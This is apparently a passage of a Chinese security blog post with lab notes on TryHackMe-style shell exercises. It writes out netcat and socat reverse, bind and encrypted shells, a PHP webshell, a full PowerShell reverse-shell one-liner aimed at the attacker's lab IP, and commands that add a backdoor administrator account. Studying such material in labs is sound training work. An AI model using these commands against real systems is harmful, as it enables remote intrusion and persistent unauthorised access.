<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165612429.png" alt="image-20240324165612429"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165911242.png" alt="image-20240324165911242"></p>
<p>第二种方法，适用于linux系统</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc -lvnp <span class="hljs-number">5555</span> &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170020857.png" alt="image-20240324170020857"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170035621.png" alt="image-20240324170035621"></p>
<p>也是成功拿到shell，接下来尝试练习反向shell</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc <span class="hljs-number">10.10</span><span class="hljs-selector-class">.197</span><span class="hljs-selector-class">.61</span> <span class="hljs-number">5555</span> &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f<span class="hljs-comment">//目标机上执行</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170258431.png" alt="image-20240324170258431"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170311947.png" alt="image-20240324170311947"></p>
<h3 id="练习4">练习4</h3>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> //kali上执行
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span> //目标机执行</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170831602.png" alt="image-20240324170831602"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170850376.png" alt="image-20240324170850376"></p>
<p>可以看到回显会出现在两个机器上，下面是绑定shell</p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span> //目标机执行
socat TCP:<span class="hljs-number">10.10</span>.<span class="hljs-number">197.61</span>:<span class="hljs-number">5555</span> -  //kali执行</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171219376.png" alt="image-20240324171219376"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171226107.png" alt="image-20240324171226107"></p>
<p>接下来尝试建立一个完美的交互式shell</p>
<pre><code class="hljs scss">socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane //目标机执行
socat TCP-L:<span class="hljs-number">5555</span> FILE:`tty`,raw,echo=<span class="hljs-number">0</span>  //kali执行</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171455324.png" alt="image-20240324171455324"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171507775.png" alt="image-20240324171507775"></p>
<p>接下来尝试socat的加密shell</p>
<pre><code class="hljs scss">openssl req <span class="hljs-attr">--newkey</span> rsa:<span class="hljs-number">2048</span> -nodes -keyout shell.key -x509 -days <span class="hljs-number">362</span> -out shell.crt
cat shell.key shell.crt &gt; shell.pem
socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> -
//以上是kali执行，下面是目标机执行
socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=<span class="hljs-number">0</span> EXEC:/bin/bash</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171817435.png" alt="image-20240324171817435"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171832766.png" alt="image-20240324171832766"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171958465.png" alt="image-20240324171958465"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172003728.png" alt="image-20240324172003728"></p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:<span class="hljs-number">5555</span>,cert=shell.pem,verify=<span class="hljs-number">0</span> EXEC:/bin/bash //目标机执行
socat OPENSSL:<span class="hljs-number">10.10</span>.<span class="hljs-number">197.61</span>:<span class="hljs-number">5555</span>,verify=<span class="hljs-number">0</span> - //kali执行</code></pre>
<p>首先开始个http服务，上传对应shell.pem到目标机</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172342525.png" alt="image-20240324172342525"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172401802.png" alt="image-20240324172401802"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172452503.png" alt="image-20240324172452503"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172446164.png" alt="image-20240324172446164"></p>
<h3 id="练习5">练习5</h3>
<p>这里尝试直接上传php_reverse_shell，但是无效</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173034082.png" alt="image-20240324173034082"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173108405.png" alt="image-20240324173108405"></p>
<p>这说明该php_reverse_shell内容只适用于unix系统</p>
<h3 id="练习6">练习6</h3>
<p>尝试上传webshell，利用shell_exec执行powershell反弹shell脚本</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<pre><code class="hljs scss">powershell -c "<span class="hljs-variable">$client</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>('<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>',<span class="hljs-number">5555</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span><span class="hljs-selector-class">.GetStream</span>();<span class="hljs-selector-attr">[byte[]</span>]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-selector-class">.65535</span>|%{<span class="hljs-number">0</span>};<span class="hljs-built_in">while</span>(($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) -ne <span class="hljs-number">0</span>){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding)<span class="hljs-selector-class">.GetString</span>($bytes,<span class="hljs-number">0</span>, $i);<span class="hljs-variable">$sendback</span> = (iex $data <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + 'PS ' + (pwd)<span class="hljs-selector-class">.Path</span> + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII)<span class="hljs-selector-class">.GetBytes</span>($sendback2);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Write</span>($sendbyte,<span class="hljs-number">0</span>,$sendbyte.Length);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Flush</span>()};<span class="hljs-variable">$client</span><span class="hljs-selector-class">.Close</span>()"</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173833707.png" alt="image-20240324173833707"></p>
<h3 id="练习7">练习7</h3>
<p>可以在上面练习6的基础上，添加用户到管理员组，直接远程登录</p>
<pre><code class="hljs scss">net user &lt;username&gt; &lt;password&gt; /add            #添加新用户
net localgroup administrators &lt;username&gt; /add  #添加用户到管理员组</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174211582.png" alt="image-20240324174211582"></p>
<pre><code class="hljs scss">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<span class="hljs-number">10.10</span>.<span class="hljs-number">90.86</span> /u:hybcx /p:<span class="hljs-string">'1234'</span>    #添加剪切板功能</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174435663.png" alt="image-20240324174435663"></p>
<h3 id="练习8">练习8</h3>
<p><strong>netcat反向shell</strong></p>
<pre><code class="hljs scss">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<span class="hljs-number">10.10</span>.<span class="hljs-number">90.86</span> /u:Administrator /p:<span class="hljs-string">'TryH4ckM3!'</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174910205.png" alt="image-20240324174910205"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174901070.png" alt="image-20240324174901070"></p>
<p><strong>netcat绑定shell</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175029199.png" alt="image-20240324175029199"></p>
<p><strong>socat反向shell</strong></p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> -
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:powershell.exe,pipes</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175225124.png" alt="image-20240324175225124"></p>
<p><strong>socat绑定shell</strong></p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> EXEC:powershell.exe,pipes
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> -</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175446521.png" alt="image-20240324175446521"></p>
<h3 id="练习9">练习9</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180823212.png" alt="image-20240324180823212"></p>
<p>使用msfvenom生成exe之后直接复制到目标机上即可，接下来进入meterpreter的监听模块</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180831608.png" alt="image-20240324180831608"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180840222.png" alt="image-20240324180840222"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180849107.png" alt="image-20240324180849107"></p>
<h3 id="练习10">练习10</h3>
<p>使用练习9遗留的分段exe，发现弹回来的shell无法使用，不能回显信息，接下来尝试不分段的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181134375.png" alt="image-20240324181134375"></p>
<p>如下图，依旧没反应</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181429758.png" alt="image-20240324181429758"></p>
<p>结果：不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。</p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/26/gdouctf-2023/">GDOUCTF2023</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/03/24/metasploit-xue-xi-2/">Metasploit学习2</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="toc-text">0x01 什么是shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x02 工具介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat"><span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit-multihandler"><span class="toc-text">Metasploit – multi&#x2F;handler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom"><span class="toc-text">Msfvenom</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-shell%E7%B1%BB%E5%9E%8B"><span class="toc-text">0x03 shell类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-shells%E5%8F%8D%E5%90%91shell"><span class="toc-text">Reverse shells（反向shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bind-shells%E7%BB%91%E5%AE%9Ashell"><span class="toc-text">Bind shells（绑定shell）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-netcat"><span class="toc-text">0x04 